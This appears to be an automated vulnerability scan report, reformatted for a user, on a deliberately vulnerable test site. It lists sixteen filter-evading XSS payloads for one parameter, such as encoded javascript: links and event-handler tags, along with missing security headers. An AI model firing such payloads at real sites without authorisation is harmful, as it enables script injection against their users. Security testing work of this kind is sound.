
**Vulnerability Report**
=====================

**Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`

**Scan Duration:** `2024-06-26 11:21:39 +0300` to `2024-06-26 11:23:13 +0300`

** Issues:**
-------------

### High Severity (19 issues)

#### XSS

* **Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`
* **Parameter:** `cat`
* **Payloads:**
        + `<script>alert(45)</script>`
        + `<meter onmouseover=alert(45)>0</meter>`
        + `<marquee onstart=alert(45)>`
        + `"><iframe/src=JavaScriPt:alert(45)>`
        + `<details/open/ontoggle="alert`45`">`
        + `<audio src onloadstart=alert(45)>`
        + `<video/poster/onerror=alert(45)>`
        + `<textarea autofocus onfocus=alert(45)>`
        + `<a href="javascript&#0000058alert(45)">XSS</a>`
        + `<select autofocus onfocus=alert(45)>`
        + `<a href="javascript&#x003a;alert(45)">XSS</a>`
        + `<a href="javascript&#0058;alert(45)">XSS</a>`
        + `<keygen autofocus onfocus=alert(45)>`
        + `<a href "&#14; javascript:alert(45)">XSS</a>`
        + `<a href="javascript&colon;alert(45)">XSS</a>`
        + `<input autofocus onfocus=alert(45)>`

### Medium Severity (1 issue)

#### STATIC ANALYSIS

* **Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`
* **Description:** Not Set CSP

### Low Severity (1 issue)

#### STATIC ANALYSIS

* **Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`
* **Description:** Not Set X-Frame-Options

### Info Severity (6 issues)

#### STATIC ANALYSIS
* **Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`
* **Descriptions:**
        + Found Server: nginx/1.19.0
        + Not set HSTS
        + Content-Type: text/html; charset=UTF-8
* **Endpoint:** `http://testphp.vulnweb.com/listproducts.php?cat=123`
* **Parameter:** `cat`
* **Payloads:**
        + `rEfe6`
        + `XsPeaR"`
        + `onhwul=64`

Let me know if this is what you were expecting!